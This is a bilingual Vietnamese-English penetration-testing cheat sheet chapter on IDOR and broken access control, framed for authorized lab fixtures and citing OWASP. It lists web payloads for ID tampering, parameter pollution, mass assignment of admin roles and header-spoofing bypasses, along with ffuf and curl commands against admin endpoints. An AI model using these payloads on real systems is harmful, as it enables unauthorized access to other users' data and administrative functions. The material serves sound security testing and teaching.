# 7. IDOR / Broken Access Control

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

IDOR (Insecure Direct Object Reference) là lỗ hổng phân quyền xảy ra khi ứng dụng cung cấp quyền truy cập trực tiếp vào các đối tượng thông qua tham số do người dùng kiểm soát mà không xác thực quyền sở hữu.

### 7.1. Horizontal Privilege Escalation / IDOR
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: URL hoặc POST data chứa trực tiếp các ID tài khoản hoặc ID tài nguyên dạng số tăng dần dễ đoán.
    *   *English*: Request parameters or routes display direct object IDs (predictable sequential integers or UUIDs).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Đăng nhập hai tài khoản cùng cấp độ quyền. Dùng token tài khoản A để gửi yêu cầu truy xuất ID của tài khoản B.
    *   *English*: Test using two accounts of equivalent privilege levels; attempt to access/modify resources of the second user.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-07-001 -->
<!-- context: Node.js 20 and Express 4.19 API fixture at victim.lab.test; synthetic users 1001-1003 and separate regular/admin bearer tokens; case: 7.1. Horizontal Privilege Escalation / IDOR -->
<!-- prerequisites: seed distinct owners and roles, keep the actor token fixed while changing only the documented object/function identifier, and capture policy/datastore logs -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the fixed actor token can read its own synthetic object but receives 403/404 for every other seeded owner; the vulnerable fixture returns the foreign marker -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
GET /api/v1/profile?id=1002                          # Attempts to access user 1002 profile (Original: 1001)
GET /api/v1/profile?id=0                             # ID 0 injection to check default/system accounts
GET /api/v1/profile?id=-1                            # Negative integer bound check
GET /api/v1/profile?id[]=1001&id[]=1002              # Array parameter injection to bypass database query limits
GET /api/v1/profile?id=1001&id=1002                  # HTTP Parameter Pollution (HPP) query manipulation
POST /api/v1/billing {"invoice_id":2045,"user_id":50}# Body parameter manipulation to change invoice owner
<request><order_id>2045</order_id><user_id>50</user_id></request> # XML parameter tampering in SOAP/XML API
GET /api/v1/profile (Header: X-User-ID: 1)           # Identity Header spoofing (Admin ID guess)
PUT /api/v1/profile {"email":"attacker@callback.lab.test"}   # Accesses update router without validating ownership
GET /api/v1/profile?id=6c84ade0-1041-11e9-8b2f-97e0049d5c41 # Guessing UUIDv1 timestamp component (valid 36-character UUIDv1 format)
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Intruder để quét thay thế tự động các ID số tăng dần hoặc sử dụng tiện ích Autorize.
    *   *English*: Use Burp Suite Intruder to iterate over sequential parameter IDs or deploy Autorize.
<!-- payload-id: CHEAT-07-002 -->
<!-- context: Node.js 20 and Express 4.19 API fixture at victim.lab.test; synthetic users 1001-1003 and separate regular/admin bearer tokens; case: 7.1. Horizontal Privilege Escalation / IDOR -->
<!-- prerequisites: seed distinct owners and roles, keep the actor token fixed while changing only the documented object/function identifier, and capture policy/datastore logs -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the fixed actor token can read its own synthetic object but receives 403/404 for every other seeded owner; the vulnerable fixture returns the foreign marker; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Fuzz sequential integer ID parameters to discover IDOR vulnerabilities using ffuf
    ffuf -u "http://victim.lab.test/api/v1/profile?id=FUZZ" -w ids_list.txt -fs <normal_response_size>
    # Fuzz UUID parameters using a custom wordlist to discover horizontal escalation
    ffuf -u "http://victim.lab.test/api/v1/profile?id=FUZZ" -w uuids_list.txt -fs <normal_response_size>
    ```


---

### 7.2. Vertical Privilege Escalation / Broken Access Control
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện các URL quản trị lộ thiên hoặc các tham số chỉ định vai trò như `role=User` hoặc `is_admin=false`.
    *   *English*: Administrative endpoints are exposed, or parameters explicitly indicate roles (e.g. `role`, `is_admin`).

<!-- payload-id: CHEAT-07-003 -->
<!-- context: Node.js 20 and Express 4.19 API fixture at victim.lab.test; synthetic users 1001-1003 and separate regular/admin bearer tokens; case: 7.2. Vertical Privilege Escalation / Broken Access Control -->
<!-- prerequisites: seed distinct owners and roles, keep the actor token fixed while changing only the documented object/function identifier, and capture policy/datastore logs -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the regular token is denied every admin function while the admin positive control succeeds; client-side role fields never change server authority -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Use curl to check access to administrative endpoint using a low-privilege token
    curl -H "Authorization: Bearer <low_privilege_token>" http://victim.lab.test/api/admin/users
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Sử dụng tài khoản thường để gửi yêu cầu đến các API/URL của Admin và xem hệ thống có từ chối truy cập không.
    *   *English*: Issue requests to administrator endpoints using standard user sessions.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-07-004 -->
<!-- context: Node.js 20 and Express 4.19 API fixture at victim.lab.test; synthetic users 1001-1003 and separate regular/admin bearer tokens; case: 7.2. Vertical Privilege Escalation / Broken Access Control -->
<!-- prerequisites: seed distinct owners and roles, keep the actor token fixed while changing only the documented object/function identifier, and capture policy/datastore logs -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the regular token is denied every admin function while the admin positive control succeeds; client-side role fields never change server authority -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
GET /admin/dashboard                                 # Direct URL access to admin endpoint
GET /api/admin/users (Bearer regular_user_token)     # Accesses administrative APIs with low privilege session
POST /api/v1/users {"username":"test","is_admin":true} # Mass Assignment parameter injection to escalate role
POST /api/v1/users {"username":"test","role":"Admin"}# Directly modifies privilege parameters in JSON body
GET /api/v1/admin/settings                           # Testing unauthenticated administrative paths
PUT /api/v1/settings {"registration_enabled":true}   # Modifies global settings route without proper verification
GET /api/v1/users/me (Header: X-Original-URL: /api/v1/admin/users) # URL rewrite bypass
GET /admin (Header: X-Custom-IP-Authorization: 127.0.0.1) # Bypasses IP access restriction via local address header
GET /admin (Header: X-Forwarded-For: 127.0.0.1)      # Local IP forwarding spoofing
POST /api/v1/user/upgrade {"user_id":1001}           # Unverified user role elevation endpoint
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Cấu hình tiện ích mở rộng Autorize trên Burp Suite để tự động lặp lại các request với quyền Admin.
*   *English*: Set up Autorize extension in Burp Suite to automatically test low-privilege sessions against administrative endpoints.

---

## Tài liệu tham khảo

- **[S1]** OWASP Authorization Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
